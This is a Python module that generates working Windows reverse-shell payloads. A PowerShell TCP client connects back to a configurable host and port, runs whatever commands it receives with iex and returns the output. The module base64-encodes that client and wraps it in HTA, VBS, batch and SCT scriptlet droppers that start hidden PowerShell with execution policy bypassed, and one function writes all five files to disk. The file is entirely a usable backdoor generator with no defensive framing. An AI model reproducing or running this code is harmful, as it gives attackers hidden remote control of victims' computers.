import os


_PS_BASE = (
    '$c=New-Object Net.Sockets.TCPClient(\'{host}\',{port});'
    '$s=$c.GetStream();'
    'while($true){{'
    '$d=(New-Object IO.StreamReader($s)).ReadLine();'
    'if(!$d){{break}}'
    '$r=iex $d 2>&1|Out-String;'
    '$w=New-Object IO.StreamWriter($s);'
    '$w.AutoFlush=$true;'
    '$w.WriteLine($r)'
    '}}'
)

_VBS_BASE = (
    'Set s=CreateObject("WScript.Shell")\n'
    's.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}",0,False\n'
)

_HTA_BASE = (
    '<html><head><script language="VBScript">\n'
    'Sub Window_OnLoad\n'
    'Dim s\n'
    'Set s=CreateObject("WScript.Shell")\n'
    's.Run "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}",0,False\n'
    'window.close\n'
    'End Sub\n'
    '</script></head><body></body></html>\n'
)

def _env_host_port(host=None, port=None):
    h = host or os.getenv('REVERSE_BACKDOOR_SERVER_HOST', '127.0.0.1')
    p = port or int(os.getenv('REVERSE_BACKDOOR_SERVER_PORT', '5555'))
    return h, p


def _ps_encode(host, port):
    import base64
    script = _PS_BASE.format(host=host, port=port)
    return base64.b64encode(script.encode('utf-16-le')).decode()


def generate_hta(host=None, port=None, tls=False):
    h, p = _env_host_port(host, port)
    b64 = _ps_encode(h, p)
    return _HTA_BASE.format(b64=b64)


def generate_vbs(host=None, port=None):
    h, p = _env_host_port(host, port)
    b64 = _ps_encode(h, p)
    return _VBS_BASE.format(b64=b64)


def generate_ps1(host=None, port=None, tls=False):
    h, p = _env_host_port(host, port)
    return _PS_BASE.format(host=h, port=p)


def generate_bat(host=None, port=None):
    h, p = _env_host_port(host, port)
    b64 = _ps_encode(h, p)
    return (
        '@echo off\n'
        f'powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}\n'
    )


def generate_sct(host=None, port=None):
    h, p = _env_host_port(host, port)
    b64 = _ps_encode(h, p)
    return (
        '<?XML version="1.0"?>\n'
        '<scriptlet>\n'
        '<registration progid="PoC" classid="{10001111-0000-0000-0000-0000FEEDACDC}">\n'
        '<script language="JScript">\n'
        '<![CDATA[\n'
        'var r = new ActiveXObject("WScript.Shell").Run('
        f'"powershell -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}",0,false'
        ');\n'
        ']]>\n'
        '</script>\n'
        '</registration>\n'
        '</scriptlet>\n'
    )


def generate_all(host=None, port=None, out_dir=None):
    if out_dir is None:
        out_dir = '.'
    os.makedirs(out_dir, exist_ok=True)
    h, p = _env_host_port(host, port)
    payloads = {
        'payload.hta': generate_hta(h, p),
        'payload.vbs': generate_vbs(h, p),
        'payload.ps1': generate_ps1(h, p),
        'payload.bat': generate_bat(h, p),
        'payload.sct': generate_sct(h, p),
    }
    for filename, content in payloads.items():
        path = os.path.join(out_dir, filename)
        with open(path, 'w') as f:
            f.write(content)
    return [os.path.join(out_dir, f) for f in payloads]
